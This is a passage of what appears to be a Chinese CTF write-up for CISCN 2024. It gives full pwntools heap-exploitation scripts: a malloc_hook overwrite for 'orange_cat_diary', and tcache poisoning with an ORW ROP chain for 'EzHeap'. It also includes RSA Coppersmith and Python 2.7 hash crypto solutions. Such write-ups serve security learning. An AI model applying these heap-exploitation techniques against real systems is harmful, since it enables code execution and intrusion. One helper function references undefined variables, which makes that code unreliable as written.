<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./orange_cat_diary&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#p = process([&quot;./ld-2.23.so&quot;,&quot;./orange_cat_diary&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)</span><br>p = remote(<span class="hljs-string">&quot;8.147.133.9&quot;</span>,<span class="hljs-number">31797</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input your choice:&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input the length of the diary content:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">b&quot;Please enter the diary content:\n&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input your choice:&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">_size_,_payload_</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input your choice:&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input the length of the diary content:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">b&quot;content:&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input your choice:&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br>one = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;tell me your name.&#x27;</span>, <span class="hljs-string">b&#x27;name&#x27;</span>)<br>add(<span class="hljs-number">0x108</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br>edit(<span class="hljs-number">0x110</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x108</span> + p64(<span class="hljs-number">0xef1</span>))<br><br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>show()<br><br>libc_base= u64((p.recv(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5100</span><br><br>one_gadget = libc_base+one[<span class="hljs-number">2</span>]<br><br>success(<span class="hljs-string">&#x27;libc:%s&#x27;</span>%<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#input()_</span><br>delete()<br><br>realloc = libc.sym[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br>edit(<span class="hljs-number">0x20</span>, p64(libc_base + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget))<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x60</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="EzHeap-复现"><a href="#EzHeap-复现" class="headerlink" title="EzHeap| 复现"></a>EzHeap| 复现</h3><p>2.35 的带沙盒堆题，堆风水不会恢复（</p>
<p>明显的 malloc2stack 后 orw</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/C9uEbMXcRo4OFkxMW4WczYVGnFd.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/C9uEbMXcRo4OFkxMW4WczYVGnFd.png"></p>
<p>高版本 + 沙盒堆块的奇妙结构</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/SEwab86Kro6qhQxobEZcqLZRn5b.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/SEwab86Kro6qhQxobEZcqLZRn5b.png"></p>
<p>需要先恢复堆块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64,u64<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br>p = process([<span class="hljs-string">&quot;./ld-linux-x86-64.so.2&quot;</span>,<span class="hljs-string">&quot;./EzHeap&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc.so.6&quot;</span>&#125;)<br>elf = ELF(<span class="hljs-string">&quot;./EzHeap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;1&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&#x27;size:&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">b&#x27;content:&#x27;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;2&#x27;</span>))<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;3&#x27;</span>))<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">b&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;choice &gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;4&#x27;</span>))<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>debug()<br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&quot;a&quot;</span>)  <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&quot;b&quot;</span>)  <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&quot;c&quot;</span>)  <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&quot;d&quot;</span>)  <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&quot;d&quot;</span>)  <span class="hljs-comment">#4</span><br><span class="hljs-comment">#恢复sandbox造成的堆风水</span><br><br>pause()<br><span class="hljs-comment">#leak libc base</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x421</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;b&quot;</span>)<br><span class="hljs-comment">#debug()</span><br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64((p.recv(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21ace0</span><br>success(<span class="hljs-string">&quot;libc_base : &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>pause()<br><span class="hljs-comment">#leak heap base_</span><br>delete(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x210</span>)<br>show(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x210</span>)<br><br>heap_base = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br>success(<span class="hljs-string">&quot;heap_base : &quot;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br>pause()<br><br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>))<br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;b&quot;</span>)<br><br>IO_2_1_stdout = libc_base+libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br><span class="hljs-comment">#pause()</span><br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>)+p64((IO_2_1_stdout-<span class="hljs-number">0x20</span>) ^ ((heap_base - <span class="hljs-number">0x2000</span>) &gt;&gt; <span class="hljs-number">12</span>)))<br><br>target_addr = libc_base+libc.symbols[<span class="hljs-string">&#x27;_environ&#x27;</span>]<br><br><span class="hljs-comment">#iofile leak stack addr_</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(libc_base+<span class="hljs-number">0x217600</span>)+p64(<span class="hljs-number">0xfbad1800</span>)+p64(libc_base+<span class="hljs-number">0x21b803</span>)*<span class="hljs-number">3</span>+p64(target_addr)+p64(target_addr+<span class="hljs-number">8</span>)<br><br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x500</span>,payload)<br><br>stack_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>success(<span class="hljs-string">&quot;stack_addr = &quot;</span>+<span class="hljs-built_in">hex</span>(stack_addr))<br>pause()<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">4</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>)+p64((stack_addr - <span class="hljs-number">0x178</span>) ^ ((heap_base) &gt;&gt; <span class="hljs-number">12</span>))<br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>,payload)<br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x0000000000170337</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000045eb0</span><br>syscall_ret = libc_base + <span class="hljs-number">0x0000000000091316</span><br>flag_addr = stack_addr - <span class="hljs-number">0x178</span><br><br><span class="hljs-comment">#orw</span><br>payload = <span class="hljs-string">b&#x27;/flag\x00&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(<span class="hljs-number">0</span>)+p64(pop_rax_ret)+p64(<span class="hljs-number">2</span>)+p64(syscall_ret)<br>payload += p64(pop_rdi_ret)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_ret)+p64(stack_addr+<span class="hljs-number">0x300</span>)+p64(pop_rdx_ret)+p64(<span class="hljs-number">0x50</span>)+p64(pop_rax_ret)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span>+p64(<span class="hljs-number">0</span>)+p64(syscall_ret)<br>payload += p64(pop_rdi_ret)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_ret)+p64(stack_addr+<span class="hljs-number">0x300</span>)+p64(pop_rdx_ret)+p64(<span class="hljs-number">0x50</span>)+p64(pop_rax_ret)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span>+p64(<span class="hljs-number">1</span>)+p64(syscall_ret)<br><br>add(<span class="hljs-number">0x200</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="OvO"><a href="#OvO" class="headerlink" title="OvO"></a>OvO</h3><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>nbits = <span class="hljs-number">512</span><br>p = getPrime(nbits)<br>q = getPrime(nbits)<br>n = p * q<br>phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    kk = getPrime(<span class="hljs-number">128</span>)<br>    rr = kk + <span class="hljs-number">2</span><br>    e = <span class="hljs-number">65537</span> + kk * p + rr * ((p+<span class="hljs-number">1</span>) * (q+<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> gcd(e, phi) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br>e = e &gt;&gt; <span class="hljs-number">200</span> &lt;&lt; <span class="hljs-number">200</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span><br><span class="hljs-string">e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span><br><span class="hljs-string">c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a><strong>解题思路</strong></h2><p>有两个部分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">e = <span class="hljs-number">65537</span> + kk * p + rr * ((p+<span class="hljs-number">1</span>) * (q+<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> gcd(e, phi) == <span class="hljs-number">1</span>:<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">e = e &gt;&gt; <span class="hljs-number">200</span> &lt;&lt; <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure>
<p>题目里给出了一个奇怪构造的e，e与phi有逆元，且e的后 200 bits 被抹去。<br>根据给出的题目有<br>$$e &#x3D; 65538 + kkp + rr(p+1)(q+1)&#x3D;rrN + rr(p+q+1)+kkp + 65538$$<br>因为 $$N<br>$$ 的 bits 足够大，那么 $$\frac{e}{N}$$ 就能得到关键的 $$rr<br>$$ 和 $$kk$$ ：<br>$$rr &#x3D; \frac{e}{N} \ kk &#x3D; rr - 2<br>$$<br>令 $$e$$  两边同时乘 $$p$$ ：<br>$$pE &#x3D; rrNp+rr(p^2+N+p)+kkp^2 + 65538p &#x3D; (rr +kk)p^2 + (rr+N +65538)p + rrN$$<br>现在就有了一个关于 $$p$$ 的方程，解出方程就能分解 $$p$$，但是问题在于只给出了 $$e<br>$$ 的高位，而不是完整的 $$e<br>$$。<br>于是考虑在实数上求多项式的根，然后再转到 $$Z_n$$ 上进行 copperSmith。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">PR.&lt;x&gt; = PolynomialRing(RealField(<span class="hljs-number">1000</span>))<br>f = (kk+rr)*x**<span class="hljs-number">2</span> + (rr*n+<span class="hljs-number">65538</span>)*x + rr*n - e*x<br>res = f.roots()<br><span class="hljs-keyword">if</span> res:<br>   <span class="hljs-built_in">print</span>(res)<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>      <span class="hljs-built_in">print</span>(i[<span class="hljs-number">0</span>])<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure>

<p>完整脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span><br>e = <span class="hljs-number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span><br>c = <span class="hljs-number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span><br><br>rr = e // n<br>kk = rr - <span class="hljs-number">2</span><br><br>PR.&lt;x&gt; = PolynomialRing(RealField(<span class="hljs-number">1000</span>))<br>f = (kk+rr)*x**<span class="hljs-number">2</span> + (rr*n+<span class="hljs-number">65538</span>)*x + rr*n - e*x<br>res = f.roots()<br><span class="hljs-keyword">if</span> res:<br>   <span class="hljs-built_in">print</span>(res)<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>      <span class="hljs-comment"># print(i[0])</span><br>      <span class="hljs-comment"># print(int(i[0]))</span><br>      P.&lt;y&gt; = PolynomialRing(Zmod(n))<br>      h = <span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]) + y<br>      rt = h.monic().small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">200</span>,beta=<span class="hljs-number">0.4</span>)<br>      <span class="hljs-keyword">if</span> rt:<br>         <span class="hljs-built_in">print</span>(rt)<br>         <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rt:<br>            p = ZZ(gcd(ZZ(h(i)),n))<br>            <span class="hljs-built_in">print</span>(p)<br>            <br>e = <span class="hljs-number">65537</span> + kk * p + rr * ((p+<span class="hljs-number">1</span>) * (q+<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span><br>q = n // ZZ(p)<br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>

<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><h2 id="题目说明-6"><a href="#题目说明-6" class="headerlink" title="题目说明"></a><strong>题目说明</strong></h2><p>💡 题目内容：你能仅仅通过一个 Python2.7 自带的 hash 函数的输出，计算出它的原象的 sha384 哈希值吗？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><br><span class="hljs-comment"># Python 2.7 (64-bit version)</span><br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> os, binascii, hashlib<br>key = os.urandom(<span class="hljs-number">7</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hash</span>(key)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">int</span>(hashlib.sha384(binascii.hexlify(key)).hexdigest(), <span class="hljs-number">16</span>) ^ <span class="hljs-built_in">int</span>(binascii.hexlify(flag), <span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">7457312583301101235</span><br><span class="hljs-number">13903983817893117249931704406959869971132956255130487015289848690577655239262013033618370827749581909492660806312017</span><br></code></pre></td></tr></table></figure>

<h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a><strong>解题思路</strong></h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a><strong>1.信息收集</strong></h3><p>首先是用 edge 的 copilot 搜索到了 python2.7 的 <code>hash()</code> 的实现，是 FNV 结构。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/neuml/py27hash/blob/master/src/python/py27hash/hash.py">https://github.com/neuml/py27hash/blob/master/src/python/py27hash/hash.py</a></p>
<p>重点关注 <code>shash()</code></p>
<p>同时还有 PEP 456 作为参考</p>
